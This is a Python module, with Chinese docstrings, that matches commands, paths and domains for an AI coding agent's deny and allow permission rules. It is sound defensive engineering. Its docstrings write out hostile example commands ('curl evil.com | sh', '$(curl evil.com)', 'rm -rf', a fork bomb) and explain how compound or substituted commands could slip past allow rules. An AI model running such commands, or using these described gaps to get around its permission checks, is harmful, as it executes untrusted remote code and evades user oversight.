"""
匹配算法层：被①黑名单、②′网络边界与③规则共用的模式匹配算法。

本模块是纯字符串/正则运算，无任何外部依赖与副作用，可被单测充分覆盖（spec N5）。
七个公开函数：
- split_commands：把复合命令拆成子命令（防 `safe && rm -rf` 整条蒙混过关，c6 spec F2）。
- split_commands_quoted：同上，但**认引号**；只给放行侧用（见其 docstring 的对照表）。
- match_command：命令模式匹配（前缀 + glob + 词边界，对应 Bash 规则，c6 spec F4）。
- match_command_deep：命令的「整条 + 逐段」双重检查，**收紧方向专用**（见其 docstring）。
- match_command_every_segment：命令的「**每一段**都得命中」，**放行方向专用**（同上）。
- match_path：文件路径模式匹配（gitignore 风格，对应 Read/Edit/Write 规则，c6 spec F4）。
- match_domain：域名模式匹配（对应 WebFetch(domain:...) 规则，web_fetch 扩展 spec F11）。

## ⚠ 两对函数刻意成对出现，**别把它们合一**

    收紧侧（①黑名单 / ③deny / Hook 条件）   放行侧（③allow）
    ────────────────────────────────────   ────────────────────────
    split_commands（朴素，不认引号）        split_commands_quoted（认引号）
    match_command_deep（任一段命中）        match_command_every_segment（每段都命中）

同一个判定形态在两个方向上**语义相反**：收紧侧「命中面越大越安全」，
放行侧「命中面越大越危险」。把任一对合并掉都会让其中一侧的方向变错，
而两次都是静默的——配置照收、界面照常，只是判定悄悄换了方向。
两处调用点（`permission/rules.py` 的命令分支）各自写明了自己用哪一个、为什么。

跨平台（c6 spec N8）：match_path 先把反斜杠归一化为正斜杠，并以大小写不敏感匹配，
以适配 Windows 路径语义。
"""

import re
from typing import Callable

# 复合命令分隔符正则：多字符操作符必须排在单字符之前，否则 `&&` 会被 `&` 抢先切坏。
# 覆盖 spec 列出的 &&、||、|&、;、|、&、换行（\n/\r）。
_SEPARATOR_RE = re.compile(r"&&|\|\||\|&|;|\||&|\n|\r")


def split_commands(command: str) -> list[str]:
    """
    把一条可能的复合命令按 shell 分隔符拆成多个子命令。

    用途：黑名单/规则匹配前先拆段，保证 `git status && rm -rf /` 这种「前半安全、
    后半危险」的命令里每一段都被独立检查，任一段命中危险即可整条拦截（spec F2/AC2）。

    实现说明：这里做的是「朴素拆分」，不解析引号。这对安全是偏保守（fail-safe）的——
    宁可多拆几段、多检查几次，也不放过藏在分隔符后的危险子命令。

    ⚠ **正因为「宁可多拆」，本函数只服务收紧侧**（①黑名单、③deny、Hook 条件）。
    放行侧用 `split_commands_quoted`，理由见那边的 docstring——一句话：
    多拆一段对收紧侧只是「多拦一次」，对放行侧却是「本该免确认的命令开始弹面板」。

    :param command: 原始命令字符串（可能含多个子命令）
    :returns: 去空白后的非空子命令列表；输入为空时返回空列表
    """
    if not command:
        return []
    parts = _SEPARATOR_RE.split(command)
    return [seg.strip() for seg in parts if seg.strip()]


def split_commands_quoted(command: str) -> list[str]:
    """
    把复合命令按 shell 分隔符拆段，但**引号内的分隔符不算分隔符**。

    :param command: 原始命令字符串
    :returns: 去空白后的非空子命令列表；输入为空时返回空列表

    副作用：无。

    ## 它为什么必须与 `split_commands` 并存，而不是取代它

    两者服务的方向相反：

    - `split_commands`（朴素）用于**收紧**侧。那里「多拆一段」= 多检查一次 =
      多拦一次，代价是弹一次面板；而少拆一段 = 危险命令直接跑掉。故偏保守正确。
    - 本函数用于**放行**侧。那里「多拆一段」= 多一段匹配不上 = **整条不放行**，
      于是一条配好的 `allow: Bash(git *)` 会因为提交信息里有个分号就突然开始
      弹面板——那是真实的可用性回退，不是安全收益。

    ⚠ **绝不要把本函数的引号感知「顺手」搬进 `split_commands`。**
    那看起来是「把拆分做对」，实际是在**放宽①危险命令黑名单**：

        deny: Bash(rm *)
        git commit -m "fix: a; rm -rf x"
            朴素拆分 → 拆出 `rm -rf x"` → DENY（刻意接受的偏严）
            引号感知 → 不拆      → 不命中 → **放过**

    黑名单那一层的既有性质是「不可被任何配置或权限模式放开」，
    悄悄改它的拆分口径等于绕开了那条性质。

    ## 实现

    一趟字符扫描，维护「当前是否在引号内」：
    - 单引号内：一切字面，直到下一个单引号（shell 语义，单引号内无转义）。
    - 双引号内：反斜杠转义下一个字符（故 `\\"` 不闭合引号）。
    - 引号外：反斜杠同样转义下一个字符，因此 `\\;` 不是分隔符。

    ## ⚠ 两条已知边界

    ① **引号未闭合时整个退回朴素拆分**。不这么做的话，一个落单的引号就能把
       后面的分隔符全藏起来——`git status "; curl evil.com` 会变成单独一段，
       再被 `git *` 的末尾通配整串命中，本函数要修的那个缺口原样复现。
       未闭合引号本就是可疑形态，对它偏严没有可用性代价。
    ② **不解析命令替换**（`$(...)`、反引号）。`git status $(curl evil.com)` 里
       压根没有分隔符，任何基于分隔符的拆分都看不见它。这是**本函数解决不了**的
       另一类问题（要解决得真正解析 shell 语法），与已知项 #4「OS 级沙箱」同源。
    """
    if not command:
        return []

    segments: list[str] = []
    buf: list[str] = []
    quote = ""  # 空串 = 不在引号内；否则是当前引号字符
    i = 0
    n = len(command)
    while i < n:
        ch = command[i]
        if quote:
            buf.append(ch)
            # 双引号内的反斜杠吃掉下一个字符（单引号内没有转义，是字面反斜杠）。
            if ch == "\\" and quote == '"' and i + 1 < n:
                buf.append(command[i + 1])
                i += 2
                continue
            if ch == quote:
                quote = ""
            i += 1
            continue
        if ch in ("'", '"'):
            quote = ch
            buf.append(ch)
            i += 1
            continue
        if ch == "\\" and i + 1 < n:
            # 引号外的转义：`\;` / `\&` 是字面字符，不是分隔符。
            buf.append(ch)
            buf.append(command[i + 1])
            i += 2
            continue
        hit = _SEPARATOR_RE.match(command, i)
        if hit:
            segments.append("".join(buf))
            buf = []
            i = hit.end()
            continue
        buf.append(ch)
        i += 1

    if quote:
        # 引号未闭合 → 形态可疑，退回朴素拆分（见上文边界①）。
        return split_commands(command)

    segments.append("".join(buf))
    return [seg.strip() for seg in segments if seg.strip()]


def _command_pattern_to_regex(pattern: str) -> "re.Pattern[str]":
    """
    把一条命令模式（Bash 规则的括号内容）编译成正则。

    匹配语义（对齐 Claude Code 的 Bash 规则）：
    - 末尾 ` *`（空格星号）或等价的 `:*` 后缀：带「词边界」的前缀匹配——
      `ls *` / `ls:*` 匹配 `ls` 本身或 `ls <任意>`，但不匹配 `lsof`（不会粘连成新词）。
    - 其它位置的 `*`：普通通配，匹配任意字符序列（含空格），可跨多个参数，
      如 `git * main` 匹配 `git checkout main`。
    - 无 `*`：精确匹配整条命令。

    :param pattern: 命令模式，如 "git *"、"git * main"、"npm run build"
    :returns: 已编译的正则，供 fullmatch 使用
    """
    # 末尾 `:*` 归一化为 ` *`（两者等价，且冒号只在末尾作通配语义）。
    if pattern.endswith(":*"):
        pattern = pattern[:-2] + " *"

    # 识别末尾 ` *` 的「词边界前缀」语义：核心 = 去掉末尾 ` *` 的部分。
    trailing_prefix = pattern.endswith(" *")
    core = pattern[:-2] if trailing_prefix else pattern

    # 转义核心里的正则元字符，再把其中的 `*`（转义后是 \*）还原成通配 .*。
    core_regex = re.escape(core).replace(r"\*", ".*")

    if trailing_prefix:
        # 词边界：核心之后要么结束，要么跟一个空格再接任意内容 → 不会粘连成 `lsof`。
        body = core_regex + r"(?: .*)?"
    else:
        body = core_regex
    return re.compile(r"^" + body + r"$")


def match_command(pattern: str, command: str) -> bool:
    """
    判断一条命令是否匹配给定的命令模式（Bash 规则）。

    :param pattern: 规则模式（括号内容）；空串表示「匹配该工具所有命令」
    :param command: 待匹配的命令字符串
    :returns: 命中返回 True

    注意：本函数对单条命令做整体匹配，不负责拆分复合命令；调用方按需改用
    match_command_deep（它内部会先整条、再逐段）。
    """
    if pattern == "":
        return True
    return _command_pattern_to_regex(pattern).fullmatch(command.strip()) is not None


def match_command_deep(command: str, predicate: Callable[[str], bool]) -> bool:
    """
    命令的「**整条 + 逐段**」双重检查——与①危险命令黑名单同口径。

    :param command: 待检命令字符串（可能是一条复合命令）
    :param predicate: 对**单条**命令做判定的函数（如 `lambda one: match_command(pat, one)`）
    :returns: 整条命中、或任一子命令命中即为 True
    :raises: 不抛异常（predicate 自身抛出的除外）

    副作用：无。

    ## 为什么两半都要，一半都不能省

    - **整条**这一半：像 fork 炸弹 `:(){ :|:& };:` 这类「分隔符本身就是语法的一部分」
      的结构，拆碎之后反而谁都匹配不到；而 `git * main` 这种跨参数的模式也只有
      对整条求值才有意义。
    - **逐段**这一半：`git status && git push origin main` 里的 `git push origin main`
      只有拆开才看得见。⚠ **这不是攻击者构造的形态**——C12 验收期实测，真实模型
      在一次普通的「改完提交推上去」请求里自然就产出了这种写法。

    ## ⚠ 它只能用在「收紧」的一侧

    本函数**放宽**了命中面（能命中的命令集合只会变大、不会变小），因此：

    - 用在 **deny / 拦截 / 升级为确认** 这类结论上 → 方向正确，偏严即偏安全。
    - 用在 **allow / 放行** 这类结论上 → **方向错误**。一条 `allow: Bash(npm *)`
      会因此命中 `npm ci && rm -rf x`，等于用户写下的一条窄放行被悄悄扩成了宽放行。

    调用方（`permission/rules.py` 的命令分支、`hooks/conditions.py` 的命令类字段）
    都在各自的位置写明了这个不对称，**不要「顺手统一」成两侧都拆**。
    放行侧要用的是它的对偶——`match_command_every_segment`。

    ## 共用一份实现的理由

    同一个坑出现过两次（C6 的③规则层、C12 的 Hook 条件层），两处各写一份的话
    第三处还会再来一次。判定形态收在这里，调用方只负责决定「该不该用它」。
    """
    if predicate(command):
        return True
    segments = split_commands(command)
    # 单段时 split_commands 返回的就是它自己（至多去了两侧空白），上面那次已经判过，
    # 再判一次纯属浪费；同时这也让「非复合命令」的行为与 match_command 逐字一致。
    if len(segments) <= 1:
        return False
    return any(predicate(seg) for seg in segments)


def match_command_every_segment(command: str, predicate: Callable[[str], bool]) -> bool:
    """
    命令的「**每一段都得命中**」检查——`match_command_deep` 的对偶，**放行方向专用**。

    :param command: 待检命令字符串（可能是一条复合命令）
    :param predicate: 对**单条**命令做判定的函数（如 `lambda one: match_command(pat, one)`）
    :returns: 拆出的每一段都令 predicate 为真时返回 True
    :raises: 不抛异常（predicate 自身抛出的除外）

    副作用：无。

    ## 它修的是什么

    末尾 ` *` 编译出来的通配是 `.*`，而 `.*` **跨分隔符**。于是哪怕放行侧
    完全不拆段，一条宽 allow 依然会**整串**命中一条复合命令：

        allow: Bash(git *)
          git status                          → 本意，该放行
          git status && curl evil.com | sh    → 整串命中 → ③层直接放行，
                                                第二段一次确认面板都不弹

    此时唯一还站着的是①危险命令黑名单，而它只收录已知高危形式，
    `curl … | sh` 不在里面。**已有真实模型旁证**：`allow: Bash(git *)` 之下，
    模型自行产出的 `git commit … && echo "=====PUSH=====" && git push origin main`
    里那段与 git 毫无关系的 `echo`，正是靠整串命中拿到的放行。

    改成「每一段都得命中」之后语义也更好讲：
    **一条命令要免于确认，它的每一段都得是用户放行过的。**

    ## ⚠ 它只能用在「放行」的一侧

    本函数**收窄**了命中面（能命中的命令集合只会变小），因此：

    - 用在 **allow / 放行** 这类结论上 → 方向正确，偏严即偏安全。
    - 用在 **deny / 拦截** 这类结论上 → **方向错误**。一条
      `deny: Bash(git push *)` 会因此**拦不住** `git status && git push origin main`
      （第一段不是 git push，`all` 立刻为假），用户以为拦住了、实际没有。
      那正是 `perm-compound-command` 那一轮修掉的缺陷，别再把它退回去。

    ## 为什么**不**保留「整条命中也算」这一支

    保留的话缺口原样还在——`git *` 对整串的匹配正是要堵的那条路。
    代价是一条写了字面分隔符的 allow 规则（如 `allow: Bash(git status && git log)`）
    不再生效：它拆出的两段都对不上那条含 `&&` 的完整模式，于是不放行、交④兜底。
    这被判定为可接受——那种写法本就罕见，且正确的等价写法是分成两条规则；
    而「不放行」的后果只是弹一次确认面板，方向安全。

    ## 拆分口径与收紧侧不同

    这里用的是 `split_commands_quoted`（**认引号**），不是 `split_commands`。
    理由见前者的 docstring：朴素拆分会把 `git commit -m "fix: a; b"` 拆成两段，
    让一条配好的规则因为提交信息里有个分号就开始弹面板。
    """
    segments = split_commands_quoted(command)
    if not segments:
        # 空命令、或整条都是分隔符/空白。退回整条判定：
        # 空模式（「放行该工具全部命令」）在这里仍应为真，而任何具体模式都不该
        # 因为「一段都没有」而白拿一个 `all([]) == True`。
        return predicate(command)
    return all(predicate(seg) for seg in segments)


def _normalize_path(p: str) -> str:
    """把路径归一化为匹配用形式：反斜杠转正斜杠、去掉开头的 `./`（spec N8 跨平台）。"""
    p = p.replace("\\", "/")
    while p.startswith("./"):
        p = p[2:]
    return p


def _path_body_to_regex(pattern: str) -> str:
    """
    把一条含 `/` 的路径模式翻译成正则主体（不含 ^ $ 锚点）。

    gitignore 风格语义：
    - `**/`：跨任意层目录（含零层），故 `**/.env` 同时匹配 `.env` 与 `a/b/.env`
    - `**`（结尾）：匹配其后任意深度内容，如 `src/**` 匹配 `src/a/b.py`
    - `*`：段内通配，不跨越 `/`
    - 其余字符按字面（正则转义）

    :param pattern: 已归一化、已去前导锚点的路径模式
    :returns: 正则主体字符串
    """
    out: list[str] = []
    i = 0
    n = len(pattern)
    while i < n:
        if pattern[i] == "*":
            if pattern[i : i + 2] == "**":
                if pattern[i : i + 3] == "**/":
                    # `**/` → 可选的「任意层目录」，使零层时也能匹配根下文件
                    out.append(r"(?:.*/)?")
                    i += 3
                else:
                    # 结尾或独立的 `**` → 任意内容（可跨目录）
                    out.append(r".*")
                    i += 2
            else:
                # 单 `*` → 段内通配（不跨 `/`）
                out.append(r"[^/]*")
                i += 1
        else:
            out.append(re.escape(pattern[i]))
            i += 1
    return "".join(out)


def match_path(pattern: str, path: str) -> bool:
    """
    判断一个文件路径是否匹配给定的路径模式（Read/Edit/Write 规则，gitignore 风格）。

    规则：
    - 裸文件名（模式不含 `/`，可带 `*`）：匹配路径的「basename」，等价任意深度命中。
      例：`.env` 命中 `src/.env`；`*.env` 命中 `a/b/c.env`。
    - 含 `/` 的模式：按路径整体匹配。模式以 `/` 开头表示锚定到根（去掉该 `/`），
      否则同样从头锚定（gitignore 中含斜杠模式默认锚定）。`**`/`*` 语义见 _path_body_to_regex。

    跨平台：路径与模式都先归一化（反斜杠→正斜杠），并大小写不敏感匹配（适配 Windows，spec N8）。

    :param pattern: 规则模式（括号内容）；空串表示「匹配该工具所有路径」
    :param path: 待匹配的文件路径或 glob 模式串
    :returns: 命中返回 True
    """
    if pattern == "":
        return True

    norm_pattern = _normalize_path(pattern)
    norm_path = _normalize_path(path)

    if "/" not in norm_pattern:
        # 裸文件名：匹配 basename，任意深度。
        basename = norm_path.rsplit("/", 1)[-1]
        # 转义除 * 外的元字符：先按 * 切，逐段 escape 再用 [^/]* 连接。
        parts = [re.escape(seg) for seg in norm_pattern.split("*")]
        seg_regex = "[^/]*".join(parts)
        return re.fullmatch(seg_regex, basename, re.IGNORECASE) is not None

    # 含斜杠：锚定匹配整条路径。
    anchored = norm_pattern.lstrip("/")
    body = _path_body_to_regex(anchored)
    return re.fullmatch(body, norm_path, re.IGNORECASE) is not None


def _normalize_domain(text: str) -> str:
    """
    把域名模式或主机名归一化为匹配用形式：去两侧空白、转小写、去掉末尾的 `.`。

    末尾点要去掉，是因为 `example.com.` 与 `example.com` 在 DNS 里指同一个域
    （前者是「完全限定域名」的书写形式）。不归一化的话，一条 `allow` 规则会被
    多写/少写一个点绕过。

    :param text: 域名模式或主机名
    :returns: 归一化后的字符串
    """
    return text.strip().lower().rstrip(".")


def match_domain(pattern: str, host: str) -> bool:
    """
    判断一个主机名是否匹配给定的域名模式（WebFetch 规则，spec F11）。

    :param pattern: 规则模式，即 `WebFetch(domain:<模式>)` 里去掉 `domain:` 前缀后的部分；
                    空串表示「匹配该工具的所有调用」（与 match_command / match_path 同口径）
    :param host: 待匹配的主机名（不含协议、端口、路径与查询参数）
    :returns: 命中返回 True

    匹配语义（逐条对齐 Claude Code，便于用户迁移既有配置）：

    | 模式             | 匹配                                   | 不匹配                          |
    |------------------|----------------------------------------|---------------------------------|
    | `example.com`    | `example.com`                          | `api.example.com`               |
    | `*.example.com`  | `api.example.com`、`a.b.example.com`   | 裸域 `example.com` 本身         |
    | `*`              | 一切主机名                             | —                               |
    | `example.*`      | `example.org`（`*` 取到 `org`）        | `example.evil.com`（需跨越一点）|

    **最后一行是安全要求而非风格选择。** 若非前导位置的 `*` 允许跨点匹配，
    一条本意为「放行 example 各国域名」的 `example.*` 会连带放行攻击者可以自行注册的
    `example.evil.com`。因此除**前导 `*.`** 与**单独一个 `*`** 这两种写法外，
    `*` 一律只匹配「两个点之间」的一段文本（正则用 `[^.]*`，与 match_path 里
    单个 `*` 不跨 `/` 是同一手法）。

    大小写不敏感，模式与主机名末尾的 `.` 都先行去除（见 _normalize_domain）。

    副作用：无。
    """
    if pattern == "":
        return True

    norm_pattern = _normalize_domain(pattern)
    norm_host = _normalize_domain(host)

    # 归一化后模式为空（例如原文只有一个 "."）视为匹配全部，与空模式同口径。
    if norm_pattern == "" or norm_pattern == "*":
        return True

    # 前导 `*.`：匹配任意深度子域，但**不匹配裸域本身**。
    # 用 endswith("." + 基域) 而不是正则，是因为这条语义与「段数」无关，
    # 只要求「以 .<基域> 结尾」，写成字符串判断比正则更难写错。
    if norm_pattern.startswith("*."):
        base = norm_pattern[2:]
        if base == "":
            return True
        return norm_host.endswith("." + base)

    # 其余：把模式按 `*` 切段，逐段转义后用 `[^.]*` 连接（不跨点），整体锚定匹配。
    parts = [re.escape(seg) for seg in norm_pattern.split("*")]
    body = "[^.]*".join(parts)
    return re.fullmatch(body, norm_host) is not None
